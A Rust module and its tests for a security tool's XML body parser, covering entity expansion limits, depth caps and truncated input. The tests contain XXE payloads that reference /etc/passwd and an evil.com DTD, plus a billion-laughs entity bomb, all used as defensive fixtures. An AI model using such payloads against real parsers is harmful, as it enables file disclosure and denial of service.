//! XML bodies, read with quick-xml's pull parser. It never loads external
//! resources and doesn't recurse, so XXE and deep nesting are non-issues.
//! quick-xml leaves the DTD alone; internal entities declared in the DOCTYPE
//! are expanded here, because PHP applications parsing the body with libxml2
//! see their replacement text too.

use super::{AppsecBodyTape, TapeWriter};
use quick_xml::errors::{Error, SyntaxError};
use quick_xml::escape::resolve_xml_entity;
use quick_xml::events::{BytesStart, Event};
use quick_xml::Reader;
use std::collections::HashMap;

/// Minimum number of bytes internal entity expansion may produce; larger
/// inputs get four times their size.
const MIN_EXPANSION_BUDGET: usize = 64 * 1024;
const MAX_REFERENCE_LEN: usize = 256;

pub(super) fn parse(input: &[u8], max_depth: u32) -> AppsecBodyTape {
    let mut parser = XmlParser {
        tape: TapeWriter::default(),
        max_depth,
        depth: 0,
        suppressed: 0,
        root_seen: false,
        text: Vec::new(),
        entities: HashMap::new(),
        expansion_budget: input.len().saturating_mul(4).max(MIN_EXPANSION_BUDGET),
    };
    let mut reader = Reader::from_reader(input);
    let config = reader.config_mut();
    config.check_end_names = false;
    config.allow_unmatched_ends = true;
    let complete = loop {
        let event_start = reader.buffer_position() as usize;
        match reader.read_event() {
            Ok(Event::Start(e)) => parser.start(&e, false),
            Ok(Event::Empty(e)) => parser.start(&e, true),
            Ok(Event::End(_)) => parser.end(),
            Ok(Event::Text(e)) => parser.text(&e),
            Ok(Event::CData(e)) => parser.raw_text(&e),
            Ok(Event::DocType(e)) => parser.doctype(&e),
            Ok(Event::Eof) => break true,
            Ok(_) => {}
            Err(Error::Syntax(SyntaxError::UnclosedTag)) => {
                parser.truncated_start(input.get(event_start..).unwrap_or_default());
                break false;
            }
            Err(_) => break false,
        }
    };
    parser.finish(complete)
}

enum Entity {
    Internal(Vec<u8>),
    External,
}

struct XmlParser {
    tape: TapeWriter,
    max_depth: u32,
    /// Number of open elements whose content is recorded.
    depth: u32,
    /// Nesting level inside an element whose content is dropped.
    suppressed: u32,
    root_seen: bool,
    /// Text of the current element since the last child element.
    text: Vec<u8>,
    entities: HashMap<Vec<u8>, Entity>,
    expansion_budget: usize,
}

impl XmlParser {
    fn start(&mut self, e: &BytesStart, empty: bool) {
        self.open_element(e.name().as_ref(), Some(e), empty);
    }

    fn open_element(&mut self, name: &[u8], e: Option<&BytesStart>, empty: bool) {
        self.flush_text();
        // Elements after the root element are dropped like nested content.
        if self.suppressed > 0 || (self.root_seen && self.depth == 0) {
            if !empty {
                self.suppressed += 1;
            }
            return;
        }
        self.root_seen = true;
        self.tape.map_start();
        self.tape.key(name);
        self.tape.list_start();
        if let Some(e) = e {
            self.attributes(e);
        }
        if empty || self.depth >= self.max_depth {
            self.tape.end();
            self.tape.end();
            if !empty {
                self.suppressed = 1;
            }
        } else {
            self.depth += 1;
        }
    }

    fn attributes(&mut self, e: &BytesStart) {
        let mut attributes = e.attributes();
        attributes.with_checks(false);
        let mut seen: Vec<&[u8]> = Vec::new();
        let mut name_buf = Vec::new();
        let mut value = Vec::new();
        for attribute in attributes {
            let Ok(attribute) = attribute else {
                break;
            };
            let name = attribute.key.into_inner();
            if name == b"xmlns" || name.starts_with(b"xmlns:") || seen.contains(&name) {
                continue;
            }
            if seen.is_empty() {
                self.tape.map_start();
            }
            seen.push(name);
            name_buf.clear();
            name_buf.push(b'@');
            name_buf.extend_from_slice(name);
            value.clear();
            self.unescape(&attribute.value, &mut value);
            self.tape.key(&name_buf);
            self.tape.str(&value);
        }
        if !seen.is_empty() {
            self.tape.end();
        }
    }

    fn end(&mut self) {
        self.flush_text();
        if self.suppressed > 0 {
            self.suppressed -= 1;
        } else if self.depth > 0 {
            self.tape.end();
            self.tape.end();
            self.depth -= 1;
        }
    }

    fn recording(&self) -> bool {
        self.suppressed == 0 && self.depth > 0
    }

    fn text(&mut self, raw: &[u8]) {
        if self.recording() && !is_whitespace(raw) {
            let mut text = std::mem::take(&mut self.text);
            self.unescape(raw, &mut text);
            self.text = text;
        }
    }

    fn raw_text(&mut self, raw: &[u8]) {
        if self.recording() && !is_whitespace(raw) {
            self.text.extend_from_slice(raw);
        }
    }

    fn flush_text(&mut self) {
        if !self.text.is_empty() {
            self.tape.str(&self.text);
            self.text.clear();
        }
    }

    /// The input ended inside a start tag: keep the element, without
    /// attributes.
    fn truncated_start(&mut self, tail: &[u8]) {
        let Some(tag) = tail.iter().position(|&b| b == b'<') else {
            return;
        };
        let tag = &tail[tag + 1..];
        let name = &tag[..tag
            .iter()
            .position(|&b| !is_name_byte(b))
            .unwrap_or(tag.len())];
        if !name.is_empty() {
            self.open_element(name, None, false);
        }
    }

    /// Collects the general entities declared in the internal subset.
    fn doctype(&mut self, raw: &[u8]) {
        const DECLARATION: &[u8] = b"<!ENTITY";
        let mut rest = raw;
        while let Some(pos) = rest
            .windows(DECLARATION.len())
            .position(|w| w == DECLARATION)
        {
            rest = skip_whitespace(&rest[pos + DECLARATION.len()..]);
            let parameter = rest.first() == Some(&b'%');
            if parameter {
                rest = skip_whitespace(&rest[1..]);
            }
            let name_len = rest
                .iter()
                .position(|&b| !is_name_byte(b))
                .unwrap_or(rest.len());
            let (name, after) = rest.split_at(name_len);
            rest = skip_whitespace(after);
            // The first declaration of an entity is binding.
            if parameter || name.is_empty() || self.entities.contains_key(name) {
                continue;
            }
            match rest.first() {
                Some(&quote @ (b'"' | b'\'')) => {
                    let Some(len) = rest[1..].iter().position(|&b| b == quote) else {
                        break;
                    };
                    let mut value = Vec::new();
                    self.unescape(&rest[1..1 + len], &mut value);
                    self.entities.insert(name.to_vec(), Entity::Internal(value));
                    rest = &rest[len + 2..];
                }
                _ if rest.starts_with(b"SYSTEM") || rest.starts_with(b"PUBLIC") => {
                    self.entities.insert(name.to_vec(), Entity::External);
                }
                _ => {}
            }
        }
    }

    /// Resolves character and entity references. References which can't be
    /// resolved (unknown, external or over budget) stay as written.
    fn unescape(&mut self, raw: &[u8], out: &mut Vec<u8>) {
        let mut rest = raw;
        while let Some(amp) = rest.iter().position(|&b| b == b'&') {
            out.extend_from_slice(&rest[..amp]);
            rest = &rest[amp..];
            let reference = rest[1..]
                .iter()
                .take(MAX_REFERENCE_LEN)
                .position(|&b| b == b';')
                .map(|len| &rest[1..1 + len])
                .filter(|name| {
                    !name.is_empty() && name.iter().all(|&b| b == b'#' || is_name_byte(b))
                });
            let Some(name) = reference else {
                out.push(b'&');
                rest = &rest[1..];
                continue;
            };
            let (reference, after) = rest.split_at(name.len() + 2);
            if !self.resolve(name, out) {
                out.extend_from_slice(reference);
            }
            rest = after;
        }
        out.extend_from_slice(rest);
    }

    fn resolve(&mut self, name: &[u8], out: &mut Vec<u8>) -> bool {
        if let Some(number) = name.strip_prefix(b"#") {
            let code = match number.strip_prefix(b"x") {
                Some(hex) => parse_code(hex, 16),
                None => parse_code(number, 10),
            };
            return match code.and_then(char::from_u32) {
                Some(c) => {
                    out.extend_from_slice(c.encode_utf8(&mut [0; 4]).as_bytes());
                    true
                }
                None => false,
            };
        }
        if let Some(value) = std::str::from_utf8(name).ok().and_then(resolve_xml_entity) {
            out.extend_from_slice(value.as_bytes());
            return true;
        }
        match self.entities.get(name) {
            Some(Entity::Internal(value)) if value.len() <= self.expansion_budget => {
                self.expansion_budget -= value.len();
                out.extend_from_slice(value);
                true
            }
            _ => false,
        }
    }

    fn finish(mut self, complete: bool) -> AppsecBodyTape {
        self.flush_text();
        self.tape.finish(complete)
    }
}

fn parse_code(digits: &[u8], radix: u32) -> Option<u32> {
    if digits.is_empty() || !digits.iter().all(|b| (*b as char).is_digit(radix)) {
        return None;
    }
    u32::from_str_radix(std::str::from_utf8(digits).ok()?, radix).ok()
}

fn is_name_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || matches!(b, b'_' | b'-' | b'.' | b':') || b >= 0x80
}

fn is_whitespace(raw: &[u8]) -> bool {
    raw.iter()
        .all(|b| matches!(b, b' ' | b'\t' | b'\n' | b'\r'))
}

fn skip_whitespace(raw: &[u8]) -> &[u8] {
    &raw[raw
        .iter()
        .position(|&b| !is_whitespace(&[b]))
        .unwrap_or(raw.len())..]
}

#[cfg(test)]
mod tests {
    use super::super::{render, AppsecBodyStatus};

    fn xml(input: &str, max_depth: u32) -> (AppsecBodyStatus, String) {
        render(super::parse(input.as_bytes(), max_depth))
    }

    fn complete(input: &str) -> String {
        let (status, out) = xml(input, 30);
        assert_eq!(status, AppsecBodyStatus::Complete, "{input}");
        out
    }

    fn partial(input: &str) -> String {
        let (status, out) = xml(input, 30);
        assert_eq!(status, AppsecBodyStatus::Partial, "{input}");
        out
    }

    #[test]
    fn basic() {
        let input = "<note>\n  <to attr=\"x\">my recipient</to>\n  <tos>\n    <to>John</to>\n  </tos>\n  begin note\n  <p>Don&apos;t &#x41;&#66;</p>\n  <br/>\n  <br myattr=\"attr &amp; value\"/>\n</note>";
        assert_eq!(
            complete(input),
            r#"{"note":[{"to":[{"@attr":"x"},"my recipient"]},{"tos":[{"to":["John"]}]},"\n  begin note\n  ",{"p":["Don't AB"]},{"br":[]},{"br":[{"@myattr":"attr & value"}]}]}"#
        );
    }

    #[test]
    fn namespaces() {
        let input = r#"<root xmlns:ns="http://example.com/ns" xmlns="http://example.com/default">
  <ns:item ns:id="123" other:type="test">content</ns:item>
</root>"#;
        assert_eq!(
            complete(input),
            r#"{"root":[{"ns:item":[{"@ns:id":"123","@other:type":"test"},"content"]}]}"#
        );
    }

    #[test]
    fn duplicate_attributes_keep_the_first() {
        assert_eq!(complete(r#"<a x="1" x="2"/>"#), r#"{"a":[{"@x":"1"}]}"#);
    }

    #[test]
    fn cdata_and_comments() {
        assert_eq!(
            complete("<a>x<!-- c -->y<![CDATA[<z>]]></a>"),
            r#"{"a":["xy<z>"]}"#
        );
    }

    #[test]
    fn entities() {
        let input = r#"<!DOCTYPE test [
    <!ENTITY test "test">
    <!ENTITY myentity SYSTEM "/etc/passwd">
    <!ENTITY % param SYSTEM "http://evil.com/param.dtd">
    <!ENTITY nested "[&test;]">
]>
<test a="&nested;">&test;&myentity;&nested;&undeclared;&#xZZ; & x</test>"#;
        assert_eq!(
            complete(input),
            r#"{"test":[{"@a":"[test]"},"test&myentity;[test]&undeclared;&#xZZ; & x"]}"#
        );
        assert_eq!(
            complete("<!DOCTYPE note SYSTEM \"http://example.com/note.dtd\">\n<test>&test;</test>"),
            r#"{"test":["&test;"]}"#
        );
    }

    #[test]
    fn billion_laughs_is_bounded() {
        let mut input = String::from("<!DOCTYPE lolz [\n<!ENTITY lol0 \"lol\">\n");
        for i in 1..10 {
            let refs = format!("&lol{};", i - 1).repeat(10);
            input.push_str(&format!("<!ENTITY lol{i} \"{refs}\">\n"));
        }
        input.push_str("]>\n<lolz>");
        input.push_str(&"&lol9;".repeat(100));
        input.push_str("</lolz>");
        let (status, out) = xml(&input, 30);
        assert_eq!(status, AppsecBodyStatus::Complete);
        assert!(out.len() < 2 * super::MIN_EXPANSION_BUDGET, "{}", out.len());
        // Once the budget is spent, references are kept as written.
        assert!(out.contains("&lol8;"));
    }

    #[test]
    fn truncated() {
        assert_eq!(
            partial_or_complete("<root><item>content</item><other>trun"),
            r#"{"root":[{"item":["content"]},{"other":["trun"]}]}"#
        );
        assert_eq!(
            partial_or_complete("<root><a><b><c>text</c></b>"),
            r#"{"root":[{"a":[{"b":[{"c":["text"]}]}]}]}"#
        );
        assert_eq!(partial(r#"<root attr="val"#), r#"{"root":[]}"#);
        assert_eq!(
            partial(r#"<root><child a="1" b"#),
            r#"{"root":[{"child":[]}]}"#
        );
        assert_eq!(partial_or_complete("<root>"), r#"{"root":[]}"#);
        assert_eq!(xml("", 30), (AppsecBodyStatus::Empty, String::new()));
        assert_eq!(
            xml("just text", 30),
            (AppsecBodyStatus::Empty, String::new())
        );
    }

    fn partial_or_complete(input: &str) -> String {
        xml(input, 30).1
    }

    #[test]
    fn only_the_root_element_is_kept() {
        assert_eq!(complete("<a>1</a><b>2</b>"), r#"{"a":["1"]}"#);
    }

    #[test]
    fn max_depth() {
        let mut input = String::new();
        for i in 1..=35 {
            input.push_str(&format!("<l{i}>"));
        }
        input.push_str("deep");
        for i in (1..=35).rev() {
            input.push_str(&format!("</l{i}>"));
        }
        let mut expected = String::new();
        for i in 1..=30 {
            expected.push_str(&format!(r#"{{"l{i}":["#));
        }
        expected.push_str(r#"{"l31":[]}"#);
        expected.push_str(&"]}".repeat(30));
        assert_eq!(complete(&input), expected);
        assert_eq!(xml("<a x=\"1\"><b/></a>", 0).1, r#"{"a":[{"@x":"1"}]}"#);
    }

    #[test]
    fn deep_nesting_does_not_hide_later_data() {
        let input = format!(
            "<r>{}{}<p>x</p></r>",
            "<a>".repeat(100_000),
            "</a>".repeat(100_000)
        );
        let (status, out) = xml(&input, 2);
        assert_eq!(status, AppsecBodyStatus::Complete);
        assert_eq!(out, r#"{"r":[{"a":[{"a":[]}]},{"p":["x"]}]}"#);
    }

    #[test]
    fn every_truncation_point() {
        let input = r#"<?xml version="1.0"?><!DOCTYPE d [<!ENTITY e "v">]><d a="&e;"><!-- c --><x>&e;&amp;</x><![CDATA[y]]><z/></d>"#;
        for len in 0..=input.len() {
            xml(&input[..len], 30);
        }
    }
}
